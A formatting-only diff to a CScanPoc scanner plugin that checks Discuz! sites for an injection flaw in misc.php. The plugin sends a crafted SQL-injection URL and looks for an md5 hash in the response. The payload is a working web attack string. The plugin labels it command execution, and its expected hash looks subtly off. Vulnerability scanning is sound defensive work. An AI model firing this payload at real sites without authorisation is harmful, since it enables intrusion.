@@ -3,6 +3,7 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'Discuz_0024'  # 平台漏洞编号，留空
     name = 'Discuz! 命令执行'  # 漏洞名称
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Discuz!'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'ac60f974-0236-44ef-81fa-9372aca9f194'
@@ -33,19 +35,20 @@ class Poc(ABPoc):
 
             hh = hackhttp.hackhttp()
             arg = self.target
-            payload = '/bbs/misc.php?mod=stat&op=trend&xml=1&merge=1&types[1]=password`as%20statistic%20(select%20(select%20md5(12345)%20from%20pre_common_statuser,pre_ucenter_members%20as' 
-            verify_url = arg + payload 
-            code, head,res, errcode, _ = hh.http(verify_url) 
+            payload = '/bbs/misc.php?mod=stat&op=trend&xml=1&merge=1&types[1]=password`as%20statistic%20(select%20(select%20md5(12345)%20from%20pre_common_statuser,pre_ucenter_members%20as'
+            verify_url = arg + payload
+            code, head, res, errcode, _ = hh.http(verify_url)
             if code == 200 and "827ccb0eea8a706c4c34a16891f84e7b1" in res:
-                #security_hole(verify_url)
+                # security_hole(verify_url)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
-                
+
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
